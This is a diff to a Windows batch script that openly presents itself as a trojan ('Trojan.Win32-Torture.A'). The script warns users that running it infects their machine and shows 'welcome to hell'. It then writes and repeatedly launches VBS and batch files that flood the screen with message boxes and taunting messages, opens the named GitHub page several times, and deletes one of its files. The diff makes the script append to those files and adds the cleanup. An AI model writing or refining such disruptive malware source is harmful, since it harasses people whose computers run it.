@@ -10,8 +10,8 @@ echo: IF YOU WANT YOUR MACHINE INFECTED,
 echo: RUN THIS, I WILL NOT BR BLAMED!
 pause
 msg * welcome to hell
-echo MsgBox('.') > a.vbs
-echo MsgBox('y') > a.vbs
+echo MsgBox('.') >>a.vbs
+echo MsgBox('y') >>a.vbs
 start a.vbs
 start a.vbs
 start a.vbs
@@ -20,8 +20,11 @@ start https://github.com/BatatzxX/Trojan.Win32-Torture.A/
 start https://github.com/BatatzxX/Trojan.Win32-Torture.A/
 start https://github.com/BatatzxX/Trojan.Win32-Torture.A/
 start https://github.com/BatatzxX/Trojan.Win32-Torture.A/
-echo msg * HAHAHAHAAHAH > msg.bat
-echo msg * still you using this computer? > msg.bat
+echo msg * HAHAHAHAAHAH >>msg.bat
+echo msg * still you using this computer? >>msg.bat
 start msg.bat
 start msg.bat
 start msg.bat
+del msg.bat
+
+
